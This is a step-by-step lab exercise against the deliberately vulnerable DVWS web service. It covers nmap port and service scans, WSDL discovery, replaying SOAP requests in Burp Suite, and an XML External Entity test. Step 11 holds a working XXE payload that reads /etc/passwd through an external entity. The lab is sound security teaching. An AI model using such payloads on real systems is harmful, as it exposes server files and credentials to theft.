# Exercise 1 - Information Gathering on DVWS (Damn Vulnerable Web Services)

## Objective
Learn how to perform **Information Gathering (Reconnaissance)** on the DVWS platform to identify:

- Open Ports
- Running Services
- API Endpoints
- SOAP Web Service
- WSDL File
- Application Structure
- Potential Attack Surface
- XML External Entity (XXE) Vulnerability

---

# Lab Architecture

```
            Parrot Security (Attacker)
                    |
        Nmap | Burp Suite | Firefox
                    |
        -------------------------
                    |
            Ubuntu Machine
          IP: 192.168.0.19
                    |
                Docker
                    |
          DVWS (Vulnerable API)
              Port 8080
```

---

# Step 1 - Start DVWS

Login to Ubuntu

```
Username: ubuntu
Password: toor
```

Become root

```bash
sudo su
```

Move into DVWS project

```bash
cd dvws-node
```

Start the application

```bash
docker-compose up
```

### Why?

- Starts the DVWS application.
- Docker automatically creates the vulnerable environment.
- The API starts listening on **Port 8080**.

---

# Step 2 - Configure Local DNS

Open hosts file

```bash
sudo nano /etc/hosts
```

Add

```text
192.168.0.19    dvws.local
```

Save and Exit

```
CTRL + O
ENTER
CTRL + X
```

### Why?

Normally DNS converts

```
dvws.local
```

into an IP address.

Since this is a local lab, we manually map

```
dvws.local
```

to

```
192.168.0.19
```

This allows SOAP requests using

```
Host: dvws.local
```

to work correctly.

---

# Step 3 - Login to Parrot Security

```
Username: pentester
Password: toor
```

Become root

```bash
sudo su
```

---

# Step 4 - Discover Open Ports

Run SYN Scan

```bash
nmap -sS 192.168.0.19
```

### What does `-sS` mean?

TCP SYN Scan

Nmap sends

```
SYN
```

Target replies

```
SYN ACK
```

Nmap immediately sends

```
RST
```

instead of completing the connection.

### Why?

To identify **open ports** quickly.

Example output

```
22/tcp
8080/tcp
9090/tcp
```

These ports become our **attack surface**.

---

# Step 5 - Identify Running Services

Run

```bash
nmap -sV 192.168.0.19
```

### What does `-sV` mean?

Service Version Detection

Instead of only telling us

```
Port 8080 is open
```

it tells us

```
Port 8080 -> Node.js Express
Port 22 -> OpenSSH
Port 9090 -> (Service Name)
```

### Why?

Knowing the exact service helps us search for known vulnerabilities.

---

# Step 6 - Access SOAP Service

Open Firefox

Visit

```
http://192.168.0.19:8080/dvwsuserservice?wsdl
```

---

## What is WSDL?

**WSDL = Web Services Description Language**

Think of it as the API Documentation.

It tells us:

- Available Functions
- Input Parameters
- Output Format
- Service Endpoint

Example

```
Username()
Login()
Register()
```

### Why?

We learn how to communicate with the API.

---

# Step 7 - Open Burp Suite

Go to

```
Proxy
```

Turn

```
Intercept OFF
```

Click

```
Open Browser
```

Visit

```
http://192.168.0.19:8080/dvwsuserservice?wsdl
```

### Why?

Burp records every HTTP request and response.

---

# Step 8 - View HTTP History

Navigate

```
Proxy
    ↓
HTTP History
```

You will see

```
GET /dvwsuserservice?wsdl
```

### Why?

To observe how the browser communicates with the server.

---

# Step 9 - Send Request to Repeater

Right-click the request

```
Send to Repeater
```

### Why?

Repeater allows us to manually edit and resend requests.

This is useful for testing APIs.

---

# Step 10 - Send SOAP Request

Replace the request with

```http
POST /dvwsuserservice/ HTTP/1.1
User-Agent: Mozilla/5.0
Connection: close
SOAPAction: Username
Content-Type: text/xml;charset=UTF-8
Host: dvws.local
Content-Length: 463

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:urn="urn:examples:usernameservice">

<soapenv:Header/>

<soapenv:Body>

<urn:Username
soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">

<username xsi:type="xsd:string">
gero et
</username>

</urn:Username>

</soapenv:Body>

</soapenv:Envelope>
```

Click

```
Send
```

### Why?

We manually invoke the

```
Username()
```

SOAP API.

We observe how the application responds.

This helps identify

- Valid usernames
- Error messages
- Information leakage

---

# Step 11 - Test XML External Entity (XXE)

Replace the SOAP request with

```http
POST /dvwsuserservice/ HTTP/1.1
Host: dvws.local
SOAPAction: "Username"
Content-Type: text/xml;charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY exploit SYSTEM "file:///etc/passwd">

]>

<soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:urn="urn:UserService">

<soapenv:Header/>

<soapenv:Body>

<urn:Username>

<username>&exploit;</username>

</urn:Username>

</soapenv:Body>

</soapenv:Envelope>
```

Click

```
Send
```

---

# What is XXE?

XXE stands for

**XML External Entity**

The XML parser is instructed to read an external file.

```xml
<!ENTITY exploit SYSTEM "file:///etc/passwd">
```

defines an entity named

```
exploit
```

whose value is

```
/etc/passwd
```

When the XML parser processes

```xml
<username>&exploit;</username>
```

it replaces it with the contents of

```
/etc/passwd
```

---

## Why is this dangerous?

Attackers may read sensitive files such as:

- `/etc/passwd`
- SSH Keys
- Configuration Files
- API Keys
- Cloud Credentials

This occurs because the XML parser allows **External Entities**.

A secure XML parser disables this feature.

---

# Commands Used

Become Root

```bash
sudo su
```

Move to Project

```bash
cd dvws-node
```

Start DVWS

```bash
docker-compose up
```

Edit Hosts File

```bash
sudo nano /etc/hosts
```

Discover Open Ports

```bash
nmap -sS 192.168.0.19
```

Identify Services

```bash
nmap -sV 192.168.0.19
```

Open SOAP Documentation

```
http://192.168.0.19:8080/dvwsuserservice?wsdl
```

---

# Key Concepts

| Term | Meaning |
|------|----------|
| Reconnaissance | Collecting information before attacking |
| Nmap | Network scanning tool |
| Open Port | An accessible network service |
| Service Enumeration | Identifying software running on a port |
| SOAP | XML-based Web Service protocol |
| WSDL | API Documentation for SOAP |
| Burp Suite | Web application testing tool |
| HTTP History | Shows captured requests and responses |
| Repeater | Modify and resend HTTP requests |
| XML | Data format used by SOAP |
| XXE | XML External Entity attack |

---

# Lab Workflow

```
Start DVWS
      ↓
Configure Hosts File
      ↓
Nmap SYN Scan (-sS)
      ↓
Nmap Service Scan (-sV)
      ↓
Open WSDL
      ↓
Understand API
      ↓
Capture Request in Burp
      ↓
Send to Repeater
      ↓
Modify SOAP Request
      ↓
Observe Response
      ↓
Test XXE
      ↓
Read External File
```

---

# What We Learned

✅ Started DVWS using Docker

✅ Configured local hostname

✅ Performed network reconnaissance using Nmap

✅ Identified running services

✅ Enumerated SOAP API using WSDL

✅ Captured HTTP traffic using Burp Suite

✅ Used Burp Repeater to manually send SOAP requests

✅ Learned SOAP request structure

✅ Tested XML External Entity (XXE)

✅ Understood how insecure XML parsing can expose server files

---

# Exam Revision (Quick Notes)

- `docker-compose up` → Starts DVWS.
- `/etc/hosts` → Maps hostname to IP.
- `nmap -sS` → Finds open ports (SYN Scan).
- `nmap -sV` → Identifies services running on ports.
- WSDL → SOAP API documentation.
- Burp HTTP History → Captures requests.
- Burp Repeater → Edit and resend requests.
- SOAP → XML-based web service.
- XXE → Uses XML External Entities to access server files.
- `/etc/passwd` → Common Linux file used to demonstrate XXE.
